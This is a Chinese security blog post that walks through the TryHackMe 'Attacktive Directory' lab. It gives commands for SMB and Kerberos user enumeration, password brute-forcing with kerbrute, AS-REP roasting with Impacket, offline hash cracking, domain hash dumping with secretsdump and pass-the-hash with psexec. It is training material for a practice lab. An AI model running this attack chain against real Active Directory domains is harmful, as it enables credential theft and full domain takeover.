[![freeBuf](/images/logoMax.png)](/)

主站

分类

漏洞  工具  极客  Web安全  系统安全  网络安全  无线安全  设备/客户端安全  数据安全  安全管理  企业安全  工控安全

特色

头条  人物志  活动  视频  观点  招聘  报告  资讯  区块链安全  标准与合规  容器安全  公开课

[报告](https://www.freebuf.com/report)

[专辑](/column)

  * ··· __

  * [招聘站](https://job.freebuf.com)
  * ··· __

  * [公开课](https://live.freebuf.com)
  * ··· __

  * 用户服务 __

  * ··· __

  * 企业服务 __

  * ··· __

行业专区

政 府

CNCERT  CNNVD

[ 云沙箱 ](https://sandbox.freebuf.com/detect?theme=freebuf)

__

[ 登录](https://www.freebuf.com/oauth)
[注册](https://account.tophant.com/register) 创作中心

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

Attack tive Directory

  * [![]() ]()
  * 关注 

  * [ 系统安全 ](https://www.freebuf.com/articles/system)

__

__

__

__

__

__

__

Attack tive Directory

[__ ]() __2021-07-12 19:19:27 __

## 攻击活动目录

靶机：https://tryhackme.com/room/attacktivedirectory

> 本文围绕靶机来进行讨论。 --- sec875

## nmap

`nmap -p- -T4 -v 10.10.216.166`  
注意：如果想查看流量的情况，可以参考本人写的流量篇，也许可以帮助到您https://www.anquanke.com/post/id/243935

## 安装Impcket

    
    
    git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket 
    
    sudo apt install python3-pip 
    
    pip3 install -r /opt/impacket/requirements.txt 
    
    cd /opt/impacket/ && python3 ./setup.py install
    

如果有问题运行下面命令

    
    
    sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket 
    
    sudo pip3 install -r /opt/impacket/requirements.txt 
    
    cd /opt/impacket/ 
    
    sudo pip3 install . 
    
    sudo python3 setup.py install
    

## 安装bloodhound 和 neo4j

`apt install bloodhound neo4j`

## smb连接与枚举

`enum4linux -a 10.10.216.166`  
`smbclient -L \\\\10.10.216.166\\`  
![image](https://image.3001.net/images/20210712/1626083153_60ec0f516e433ec680c58.png!small)

## 枚举139，445

`nmap -p 139,445 -A -T4 -v 10.10.216.166`  
实际环境谨慎账户枚举，别把用户账号锁定

## 枚举Kerberos用户

工具安装，请查如下URL：  
https://pypi.org/project/kerbrute/

`python3 kerbrute.py`

使用字典在该github仓库获取  
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-
tools/master/userlist.txt

https://raw.githubusercontent.com/Sq00ky/attacktive-directory-
tools/master/passwordlist.txt

编辑一下 /etc/hosts 方便参数填写  
![image](https://image.3001.net/images/20210712/1626083326_60ec0ffeb043dc5bc8bd5.png!small)

`python3 kerbrute.py -dc-ip 10.10.216.166 -users /home/sec875/userlist.txt
-domain spookysec.local`  
可以看见枚举出来的用户  
![image](https://image.3001.net/images/20210712/1626083442_60ec1072a6af21a3a8868.png!small)

然后就是用工具枚举账户密码  
`python3 kerbrute.py -dc-ip 10.10.216.166 -users /home/sec875/userlist.txt
-passwords /home/sec875/passwordlist.txt -domain spookysec.local`

## kerberos服务票据预认证

快速理解的图  
![image](https://image.3001.net/images/20210712/1626083573_60ec10f5b6d925539ebbb.png!small)

## 攻击 Kerberos服务票据的预认证缺陷的点

![image](https://image.3001.net/images/20210712/1626083636_60ec1134e5b17006ee0a2.png!small)

> 参考资料：https://book.hacktricks.xyz/windows/active-directory-
> methodology/asreproast

简而言之。任何人都可以使用svc-
admin【任意用户】用户向DC发送AS_REQ请求，接收AS_REP响应。响应包中携带该用户密码的哈希。最后本地破解或者哈希传递

优势在于执行预认证攻击不需要域账户（在前面，我们使用了检索域中没有 Kerberos 预身份验证用户的工具。 否则必须猜测用户名。 ）

如果您对简图有点意见，并认为我错过了很多东西，建议参考kerberos的RFC文档（如果感觉很困难，可以联系本人，帮忙翻译）：https://www.rfc-
editor.org/rfc/rfc1510.html

可以从消息交换这里读起：  
![image](https://image.3001.net/images/20210712/1626085309_60ec17bd75705cf65e630.png!small)

## 发送请求拉取哈希

`python3 GetNPUsers.py spookysec.local/svc-admin -no-pass`  
此工具位于前面安装的Impcket包中  
![image](https://image.3001.net/images/20210712/1626085623_60ec18f7aec2a13863222.png!small)  
编程不是必须的，此代码有400多行，但我鼓励您针对性的阅读它，从里面的语法糖结构开始搜python官方文档。为了控制篇幅，代码解读则不在本文讨论范围之内。

拉取结果如下图所示  
![image](https://image.3001.net/images/20210712/1626085868_60ec19ec3dcbe1a20db06.png!small)

存到hash.txt文件里  
![image](https://image.3001.net/images/20210712/1626085900_60ec1a0c18de574c26226.png!small)

## 本地破解哈希

`john hash.txt --wordlist=passwordlist.txt`  
![image](https://image.3001.net/images/20210712/1626087113_60ec1ec9d886d9284c932.png!small)

看看共享文件夹  
![image](https://image.3001.net/images/20210712/1626087164_60ec1efcda5c2382a5c41.png!small)

关于IPC$ (默认共享，空会话等术语）请查阅微软文档，不要和共享文件夹混淆了，它们是不同的对象：  
https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/networking/inter-
process-communication-share-null-session  
![image](https://image.3001.net/images/20210712/1626087351_60ec1fb71e1aefd2b71be.png!small)

进入感兴趣的文件夹中，get拉取信息到家目录  
`smbclient \\\\10.10.216.166\\backup -U svc-admin`  
![image](https://image.3001.net/images/20210712/1626087485_60ec203d94983ed704d5b.png!small)

查看内容，base64解码  
![image](https://image.3001.net/images/20210712/1626087738_60ec213af3f4dbfeb9070.png!small)

哈希转存  
secretsdump.py 脚本在何处？嘿。相信到这里已经难不住大家了。

![image](https://image.3001.net/images/20210712/1626087900_60ec21dc0664d51dac5c4.png!small)

注意-just-dc参数转存了什么东西。  
![image](https://image.3001.net/images/20210712/1626088203_60ec230b2fd535a5a5a29.png!small)

## 哈希传递

`python3 psexec.py --help`  
找到哈希传递的参数  
![image](https://image.3001.net/images/20210712/1626088410_60ec23daa3338f61488e8.png!small)

注意，它做了一系列的权限维持

![image](https://image.3001.net/images/20210712/1626088436_60ec23f44190cdd191b56.png!small)

## 其他域控资料

https://blog.spookysec.net/kerberos-abuse/

## 结尾

如果您喜欢web安全，还可以查阅本人编辑的web安全101

要不要考虑请叔喝上一杯？  
https://www.yuque.com/sec875/blzpv4/ofepol

祝各位师傅都有所获。

我们还会再见面的。

共勉。

本文作者：， 转载请注明来自[FreeBuf.COM](https://www.freebuf.com)

__ # 渗透测试

被以下专辑收录，发现更多精彩内容

\+ 收入我的专辑

展开更多 __

评论 __按热度排序

![](https://image.3001.net/images/index/wp-user-avatar-50x50.png)

请登录/注册后在FreeBuf发布内容哦

相关推荐

![]()\

关 注

  * 0 文章数
  * 0 评论数
  * 0 关注者

文章目录

攻击活动目录

nmap

安装Impcket

安装bloodhound 和 neo4j

smb连接与枚举

枚举139，445

枚举Kerberos用户

kerberos服务票据预认证

攻击 Kerberos服务票据的预认证缺陷的点

发送请求拉取哈希

本地破解哈希

哈希传递

其他域控资料

结尾

请 [登录](https://www.freebuf.com/oauth) /
[注册](https://account.tophant.com/register.html)后在FreeBuf发布内容哦

__ 收入专辑

__

分享文章

分享到微信

分享到微博

分享到QQ

复制链接

收藏文章

匿名  发 表 取 消 有人回复时邮件通知我

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

[FreeBuf社群入口](https://www.freebuf.com/articles/others-articles/247797.html)

### 用户服务

  * [有奖投稿](https://www.freebuf.com/write)
  * [提交漏洞](https://www.vulbox.com/bounties/detail-72)
  * [参与众测](https://www.vulbox.com/projects/list)
  * [商城](https://shop.freebuf.com)

### 企业服务

  * [企业空间](https://company.freebuf.com)
  * [企业SRC](https://www.vulbox.com/service/src)
  * [漏洞众测](https://www.vulbox.com/)
  * [威胁检测](https://www.riskivy.com/)

### 合作信息

  * [寻求服务](http://freebuf2019.mikecrm.com/B9fQZDt)
  * [广告投放](https://www.freebuf.com/advertise)
  * [联系我们](mailto:help@freebuf.com)
  * [友情链接](https://www.freebuf.com/friends)

### 关于我们

  * [关于我们](https://www.freebuf.com/news/others/864.html)
  * [加入我们](https://www.freebuf.com/jobs/40386.html)
  * [微信公众号](javascript:;)

  * [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

  * [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)
  * [![](https://image.3001.net/images/20191017/1571310907_5da84d3bbdf2c.png)](http://www.upyun.com/?freebuf)
  * [![](https://image.3001.net/images/20191017/1571306606_5da83c6e8de1c.png)](https://www.trustasia.com/?freebuf)

### FreeBuf+小程序

![](/images/xcx-code.png)

扫码把安全装进口袋

  * [斗象科技](https://www.tophant.com/)
  * [FreeBuf](https://www.freebuf.com)
  * [漏洞盒子](https://www.vulbox.com/)
  * [斗象智能安全平台](https://www.riskivy.com/)
  * [免责条款](https://www.freebuf.com/dis)
  * [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2020 WWW.FREEBUF.COM All Rights Reserved [ 沪ICP备13033796号
](https://beian.miit.gov.cn/#/Integrated/index) | [ 沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)

